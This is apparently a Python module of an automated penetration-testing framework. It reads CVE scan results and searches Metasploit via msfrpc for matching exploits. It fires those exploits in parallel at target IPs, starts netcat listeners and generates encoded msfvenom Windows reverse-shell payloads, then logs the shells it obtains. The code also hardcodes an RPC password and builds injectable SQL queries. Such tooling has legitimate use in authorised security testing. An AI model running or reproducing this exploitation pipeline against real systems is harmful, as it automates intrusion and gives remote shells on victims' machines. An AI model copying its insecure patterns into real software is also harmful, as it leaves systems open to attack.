from imp import reload
import socket
import os
import subprocess
from time import sleep, time
from numpy import empty
from exploitation.pymetasploit3_updated.msfrpc import MsfRpcClient
# from pymetasploit3.msfrpc import MsfRpcClient
import sqlite3
import signal
import re
import threading
import json
import concurrent.futures
import threading
import random
import utilities
import time
import sys
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

class Exploitation:

    def __init__(self, user_id, ws, info_gathering):

        self.user_id = user_id
        self.web_socket = ws
        self.info_gathering = info_gathering
        self.interface = info_gathering.interface

        self.module = 'exploitation'

        self.is_connected_to_msfrpcd = None
        self.msf_rpc_client = None
        self.msfrpcd_password = '123'
        self.vulns_list = []
        self.vulns_list_manual = []
        self.re_msf_exploit_search = r'\d+(\s{2})exploit(.+)'
        self.session_found_re = r'(session \d+ created in the background)|(command shell session \d+ opened)'
        self.exploits_list = []
        self.sesssion_list = []
        self.executed_exploit_list = []
        self.exploitation_status = None
        self.exploitation_db_path = './exploitation.db'
        self.results_db_path = 'results.db'
        self.session_found_status = False
        self.cmd = ''
    

        self.lhost = utilities.getHostIP(self.interface)

        self.lock = threading.Lock()

        self.ip_exploit_count = 0

        self.total_exploits = 0
       
        self.exploit_send_list = []
        session = 0
        
        
    def connect_to_msfrpcd(self):

        if not self.is_connected_to_msfrpcd:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                value = s.connect_ex(('0.0.0.0', 55553)) == 0

                if not value:
                    try:
                        cmd = 'msfrpcd -n -P ' + self.msfrpcd_password
                        os.system(cmd)
                        self.is_connected_to_msfrpcd = True
                    except Exception as e:
                        print('[*] Failed to connect to msfrpcd')
                else:
                    print("[*] Server is already running")

                    try:
                
                        # iterating through each instance of the process
                        for line in os.popen("ps ax | grep msfrpcd | grep -v grep"):
                            fields = line.split()
                            
                            # extracting Process ID from the output
                            pid = fields[0]
                            
                            # terminating process
                            os.kill(int(pid), signal.SIGKILL)
                        print("Process Successfully terminated")

                        try:
                            cmd = 'msfrpcd -n -P ' + self.msfrpcd_password
                            os.system(cmd)
                            self.is_connected_to_msfrpcd = True
                        except Exception as e:
                            print('[*] Failed to connect to msfrpcd')
                            
                    except:
                        print("Error Encountered while running script")


                if self.msf_rpc_client is None:
                    self.msf_rpc_client = MsfRpcClient(self.msfrpcd_password, ssl=True)

                self.msf_rpc_client.sessions.list.clear()

            except Exception as e:
                print(e)

            if self.is_connected_to_msfrpcd:
                tempDict = dict(user_id=self.user_id, eventType='exploitation_module_status', data={'is_msf_service_started':True})

            else:
                tempDict = dict(user_id=self.user_id, eventType='exploitation_module_status', data={'is_msf_service_started':False})
            
            self.web_socket.send(json.dumps(tempDict))

    
    def identify_session_id_from_db(self, session_data):
        ip = session_data['ip']
        port = session_data['port']
        exploit = session_data['exploit']
        payload = session_data['payload']

        conn = sqlite3.connect(self.exploitation_db_path)
        cursor = conn.cursor()
        query = 'SELECT session_id from sessions where session_host = "{0}" AND via_exploit="{1}" AND via_payload="{2}" AND session_port="{3}"'.format(ip, exploit, payload, port)
        cursor.execute(query)
        sessions_id = cursor.fetchone()[0]

        return sessions_id
        
    def interact_with_session(self, session_data):
        
        exploit = session_data['exploit']
        payload = session_data['payload']
        ip = session_data['ip']
        port = int(session_data['port'])
        lhost = self.lhost
        
        cmd = os.getcwd() + '/scydes_env/bin/python3 ./exploitation/terminal_interaction.py ' + exploit + ' ' + payload + ' ' + ip + ' ' + str(port) + ' ' + lhost

        os.system("sudo gnome-terminal -e 'sh -c \"{}; exec bash\"'".format(cmd))

       
    def read_vulnerability_information_from_results_db(self,ips_list):
        
        try:
            conn = sqlite3.connect(self.results_db_path)
        except Exception as e:
            print('[*] Failed to connect to results.db ',e)
            exit()

        cursor = conn.cursor()

        for ip in ips_list:

            ip_vulns_list = []

            # query = 'SELECT ip, port, cve_id, cvss_v2, cvss_v3, service from vulnerabilities where ip = "' + ip['ip'] + '";'

            query = 'SELECT ip, port, cve_id, cvss_v2, cvss_v3, service, os_name from vulnerabilities INNER JOIN os on os.dest_host = vulnerabilities.ip where vulnerabilities.ip =  "' + ip['ip'] + '";'

            cursor.execute(query)
            
            ports_results = cursor.fetchall()

            if ports_results :
            
                for result in ports_results:
                    
                    cvss_v2 = result[3]
                    cvss_v3 = result[4]

                    # if cvss_v3 != -1 and cvss_v3 > 5.0:
                    #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])
                    #     ip_vulns_list.append(ports_dict)
                    
                    # elif cvss_v2 > 5.0:
                    #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])

                    ports_dict = dict(port=result[1], cve=result[2], service=result[5], os_name=result[6])
                    ip_vulns_list.append(ports_dict)

                tempDict = dict(ip=ip['ip'], vulnerabilities=ip_vulns_list)

                self.vulns_list.append(tempDict)

            ##########SAJJAD#######################

            for ip in ips_list:

                ip_vulns_list = []

                query = 'SELECT ip, port, service_version, cvss_v3, exploit_number, os_name from vulnerabilities_manual where ip = "' + ip['ip'] + '";'

               
                cursor.execute(query)
                
                ports_results = cursor.fetchall()

                if ports_results :     
                
                    for result in ports_results:
                        
                        cvss_v2 = result[3]
                        cvss_v3 = result[4]

                        # if cvss_v3 != -1 and cvss_v3 > 5.0:
                        #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])
                        #     ip_vulns_list.append(ports_dict)
                        
                        # elif cvss_v2 > 5.0:
                        #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])

                        ports_dict = dict(port=result[1], service_version=result[2], exploit_name = result[4], os_name=result[5])
                        ip_vulns_list.append(ports_dict)

                    tempDict = dict(ip=ip['ip'], vulnerabilities=ip_vulns_list)

                    self.vulns_list_manual.append(tempDict)
            

    def read_ip_sessions_from_db(self, ip):

        if self.exploitation_status == 'started' or self.exploitation_status == 'finished':
            conn = sqlite3.connect(self.exploitation_db_path)
            cursor = conn.cursor()
            query = 'SELECT * from sessions where rhost = "' + ip['ip'] + '";'
            cursor.execute(query)
            sessions_result = cursor.fetchall()
            
            try:
                results_db_conn = sqlite3.connect(self.results_db_path)
            except Exception as e:
                print('[*] Failed to connect to results.db ',e)
                exit()
                
            results_db_cursor = results_db_conn.cursor()

            
            ip_sessions_list = []
            for session in sessions_result:

                # service_version_query = 'SELECT service_version_display from ports where dest_host = "{0}" and port = "{1}";'.format(ip['ip'], session[2])
                # results_db_cursor.execute(service_version_query)
                # service_result = results_db_cursor.fetchone()[0]

                tempDict = dict(session_id=session[0], port=session[2], port_service=session[3], exploit=session[4], payload=session[5], status=session[6])
                ip_sessions_list.append(tempDict)

            if len(ip_sessions_list) > 0:
                tempDict2 = dict(ip=ip['ip'], session=ip_sessions_list)
                
                tempDict3 = dict(user_id=self.user_id, eventType='requested_ip_exploits_data_sent', data=tempDict2)
                
                self.web_socket.send(json.dumps(tempDict3))

    def search_exploits(self):
        
        print('[*] Searching Exploits')
        res = self.msf_rpc_client.call('console.create')
        if 'id' in res:
            console_id = res['id']

            for ip in self.vulns_list:

                ip_exploits = []

                for cve in ip['vulnerabilities']:
                    cve_id = cve['cve']
                    port = cve['port']
                    service = cve['service']

                    os_name = cve['os_name']
                    

                    search_cmd = 'search ' + cve_id + '\n'
                    clear_cmd = 'clear\n'
                    
                    console_id = self.msf_rpc_client.consoles.console().cid
                    console = self.msf_rpc_client.consoles.console(console_id)
                    console.write(search_cmd)

                    res = console.read()
                    
                
                    # self.msf_rpc_client.call('console.write', [console_id, search_cmd])

                    # res = self.msf_rpc_client.call('console.read',[console_id])

                    cve_exploits = []
                    if 'Matching Modules' in res['data']:
                        msf_exploits_res = res['data'].split('\n')

                        for line in msf_exploits_res:
                            line = line.strip()
                            if re.match(self.re_msf_exploit_search, line):
                                line = ' '.join(line.split())
                                line = line.split(' ', 5)
                                exploit_name = line[1]
                                disclosure = line[2]
                                rank = line[3]
                                check = line[4]
                                description = line[5]

                                tempDict1 = dict(exploit_name=exploit_name, disclosure=disclosure, rank=rank, check=check, description=description)
                                cve_exploits.append(tempDict1)

                    self.total_exploits += len(cve_exploits)

                    tempDict2 = dict(port=port, service=service, cve_id=cve_id, cve_exploits=cve_exploits)
                    ip_exploits.append(tempDict2)

                    console.write(clear_cmd)
                
                tempDict3 = dict(ip=ip['ip'], exploits=ip_exploits,total_ip_exploit=self.total_exploits)
                self.exploits_list.append(tempDict3)

                self.total_exploits = 0
    
    def open_netcat(self):
        
        port = random.randint(10000,20000)
        "<<<<<<<<<<<Machine 1>>>>>>>>>>>>>>>>>>>>>>>>"
        cmd = 'nc -lnvp  '+str(port)      
        # os.system("gnome-terminal -e 'sh -c \"{}; exec bash\"'".format(cmd))
        os.system("sudo gnome-terminal -e 'sh -c \"{}; exec bash\"'".format(cmd))

        return port
                
    
    def generate_powershell_shellcode(self, port, badchars):
        print(badchars,"Ye h Bad characters")

        payload = "windows/shell_reverse_tcp"

        if badchars == '' :

            self.cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f py -b "\\x00\\x0A\\x0D\" -e x86/shikata_ga_nai'.format(payload,self.lhost ,port) 
        else:
      
            print("Latest",badchars)
            
            #  badchars= badchars[:-1]
            print(badchars)

            #  cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f py -b "\\x00\\xd9" -e x86/shikata_ga_nai'.format(payload,ipaddr ,port)
            #  print(cmd)
            self.cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f py -b {3} -e x86/shikata_ga_nai'.format(payload,self.lhost ,port,badchars) 
            print(self.cmd)

        proc = subprocess.Popen(self.cmd, stdout=subprocess.PIPE, shell=True)
        data = proc.communicate()[0]
        port = 21
    
        payload_file_name = 'payload.py'
        f = open(payload_file_name, 'wb')
        f.write(data)
         
    def search_manual_exploits(self):
        
        path = "./exploitation/manual_exploits"
        dir_list = os.listdir(path)

    
        print('[*] Searching Exploits')

        for ip in self.vulns_list_manual:

            ip_exploits = []

            target_ip = ip['ip']

            for ip_exploit in ip['vulnerabilities']:

                port = ip_exploit['port']
                service_version = ip_exploit['service_version']
                bad_char = ''

                exploit_name = ip_exploit['exploit_name']
                exploit_name = exploit_name+'.py'
                os_name = ip_exploit['os_name']

                for exploit_file in dir_list :

                    if exploit_file == exploit_name:

                        port_value = self.open_netcat()
                    
                        self.generate_powershell_shellcode(port_value,bad_char)

                        # ExploitF.shell_attack(target_ip,port)


                        

                        

                        



    def create_exploit_db(self):

        if os.path.exists(self.exploitation_db_path):
            os.remove(self.exploitation_db_path)

        con = sqlite3.connect(self.exploitation_db_path)
        cur = con.cursor()

        # Create table
        try:
            cur.execute('''CREATE TABLE if not exists sessions (session_id text, rhost text, rport text, service text, exploit text, payload text, status text)''')
        except Exception as e:
            print(e)

    
    def send_session_found_to_server(self, tempDict):
         
        data = dict(eventType='session_found', data=tempDict)
        self.web_socket.send(json.dumps(data))


    def check_available_sessions(self):

        while self.exploitation_status == 'started':

            sleep(10)
          
            for k, v in self.msf_rpc_client.sessions.list.items():

                if k in self.sesssion_list :
                    exp = v['via_exploit']
                    pay = v['via_payload']
                    rhost = v['session_host']
                    port = v['session_port']

        
                    if exp and port not in self.exploit_send_list:

                        self.exploit_send_list.append(exp) 

                        self.exploit_send_list.append(port)
                    
                        tempDict = dict(session_id=k, rhost=rhost, rport=port, service='service', exploit=exp, payload=pay, exploit_count=self.ip_exploit_count, status='success')
                            
                        self.send_session_found_to_server(tempDict)

                        self.insert_session_info_to_db(tempDict)

        if self.exploitation_status == 'finished':

            sleep(10)

            for k, v in self.msf_rpc_client.sessions.list.items():
            
                if k in self.sesssion_list :
                    
                    temp = str(next(iter(v)))
                    # print(session)
                    exp = v['via_exploit']
                    pay = v['via_payload']
                    rhost = v['session_host']
                    port = v['session_port'] 
 
                   
                    if exp not in self.exploit_send_list:

                        self.exploit_send_list.append(exp) 

                        tempDict = dict(session_id=k, rhost=rhost, rport=port, service='service', exploit=exp, payload=pay, exploit_count=self.ip_exploit_count, status='success')
                            
                        self.send_session_found_to_server(tempDict)

                        self.insert_session_info_to_db(tempDict)

                        
        
    def send_ip_exploit_progress_to_server(self, ip, ip_exploit_progress):

        tempDict = dict(user_id=self.user_id, eventType='ip_exploits_progress', data={'ip':ip, 'progress':ip_exploit_progress})                
        self.web_socket.send(json.dumps(tempDict))

    def launch_exploit_thread_for_payload(self, cve_exploit, ip, port, service,total_ip_exploit,ip_exploits_count_for_progress):
             
        exploit_status = None
   
        exploit_name = cve_exploit['exploit_name'].split('/',1)[1]
                        
        print('[*] Checking ' + exploit_name)
        
        exploit = self.msf_rpc_client.modules.use('exploit', exploit_name)
        
        exploit_required_arguments = exploit.missing_required

        exploit_run_options = exploit.runoptions
        
        for exploit_argument in exploit_required_arguments:

            if exploit_argument == 'RHOSTS':
                exploit['RHOSTS'] = ip
            elif exploit_argument == 'SESSION':
                exploit['SESSION'] = True
            elif exploit_argument == 'RPORT':
                exploit['RPORT'] = port
            elif exploit_argument == 'HNAME':
                exploit['HNAME'] = self.lhost

        for exploit_ops in exploit_run_options:
            if exploit_ops == 'RPORT':
                exploit['RPORT'] = int(port)   

        target_payloads = exploit.targetpayloads()

        for payload in target_payloads:
            
            payload_name = payload

            payload = self.msf_rpc_client.modules.use('payload', payload_name)

            missing_payloads = payload.missing_required
            
            if missing_payloads == ['LHOST']:
                payload['LHOST'] = self.lhost
            
            elif missing_payloads == ['RPORT']:
                payload['RPORT'] = port

            elif missing_payloads == ['RHOSTS']:
                payload['RHOSTS'] = ip    

            elif missing_payloads == ['PATH']:
                payload['PATH'] = True

            elif missing_payloads == ['CMD']:
                payload['CMD'] = False

            elif missing_payloads == ['HNAME']:
                payload['HNAME'] = self.lhost

            if 'LPORT' in payload.options:
                payload['LPORT'] = random.randint(10000,20000)
                  
            exploit.execute(payload=payload)

            exploit_ = 'exploit/'+exploit_name

            session = self.msf_rpc_client.sessions.list

            if session:    

                for k, v in self.msf_rpc_client.sessions.list.items():

                    if exploit_ ==  v['via_exploit'] and int(port) == v['session_port'] :

                        if k not in self.sesssion_list :

                            exploit_status = 'success'

                            self.ip_exploit_count += 1

                            self.session_found_status = True

                            self.sesssion_list.append(k)

                            self.sesssion_list.append(port)
                            self.msf_rpc_client.sessions.list.update(service)
                            print(self.sesssion_list)

                    
            if self.session_found_status == True:

                self.session_found_status = False

                break

        print('[*] Finished Checking ' + exploit_name)

        if exploit_status != 'success':

            self.ip_exploit_count += 1
            tempDict = dict(session_id=-1, rhost=ip, rport=port, service=service, exploit=exploit_name, payload='None', exploit_count=self.ip_exploit_count, status='failed')
            self.insert_session_info_to_db(tempDict)
            data = dict(eventType='ip_exploit_count', data=tempDict)
            self.web_socket.send(json.dumps(data))
           
        
        ip_exploit_progress = round((ip_exploits_count_for_progress/total_ip_exploit) * 100, 2)

        with self.lock:
            print(OKGREEN + '[*] ' + str(round((ip_exploits_count_for_progress/total_ip_exploit) * 100, 2)) + ' %' + ENDC)

        self.send_ip_exploit_progress_to_server(ip, ip_exploit_progress)


    def launch_exploit_thread_for_ip(self, ip_exploits):
        
        self.ip_exploit_count = 0

        ip_exploits_count_for_progress = 0 
          
        ip = ip_exploits['ip']
        
        total_ip_exploit = ip_exploits['total_ip_exploit']
       
        print('[*] Total exploits for ' + ip + ': ' + str(total_ip_exploit))
        
        for cve_exploits in ip_exploits['exploits']:


            cve = cve_exploits['cve_id']
            
            port = cve_exploits['port']

            service = cve_exploits['service']

            if len(cve_exploits['cve_exploits']) > 0:

                print('--------------------------------')
                print('[*] Trying exploits for port {0}'.format(port))
                print('--------------------------------')

            with concurrent.futures.ThreadPoolExecutor(8) as executor:
                for cve_exploit in cve_exploits['cve_exploits']:

                    ip_exploits_count_for_progress +=1
        
                    executor.submit(self.launch_exploit_thread_for_payload, cve_exploit, ip, port, service, total_ip_exploit, ip_exploits_count_for_progress)


    def launch_exploits(self):

    
        print('[*] Launching Exploits')

        with concurrent.futures.ThreadPoolExecutor(3) as executor:
            threads = []
            for ip_exploits in self.exploits_list:
                threads.append(executor.submit(self.launch_exploit_thread_for_ip, ip_exploits))
          
            for thread in concurrent.futures.as_completed(threads): # Wait for all the threads to finish
                thread.result()

            
        print('[*] Exploitation Finished')
        self.exploitation_status = 'finished'

        self.sub_module = ''
        event_type = 'exploitation_finished'
        self.info_gathering.send_module_start_finish_time_to_server(event_type, self.module, self.sub_module)

                        

    def insert_session_info_to_db(self, session_data):

        session_data = (session_data['session_id'], session_data['rhost'], session_data['rport'], session_data['service'], session_data['exploit'], session_data['payload'], session_data['status'])
 
        con = sqlite3.connect(self.exploitation_db_path)
        insert_cmd = '''insert into sessions values (?, ?, ?, ?, ?, ?, ?)'''
        cur = con.cursor()
        cur.execute(insert_cmd, session_data)
        con.commit()
        con.close()


    def start_exploitation(self, ips_list):

        if self.info_gathering.information_gathering_status == 'Finished' and \
           self.info_gathering.vulnerability_scanning_status == 'Finished':
            if self.is_connected_to_msfrpcd:
                print('[*] Exploitation Started')

                self.exploitation_status = 'started'
                
                self.sub_module = ''
                event_type = 'exploitation_started'
                self.info_gathering.send_module_start_finish_time_to_server(event_type, self.module, self.sub_module)


                self.create_exploit_db()

                self.read_vulnerability_information_from_results_db(ips_list)

                self.search_manual_exploits()
                self.search_exploits()
              
                launch_exploits_thread = threading.Thread(target=self.launch_exploits)
                launch_exploits_thread.start()

                launch_exploits_thread = threading.Thread(target=self.check_available_sessions)
                launch_exploits_thread.start()

            else:
                print('[*] Exploitation Could not be started')

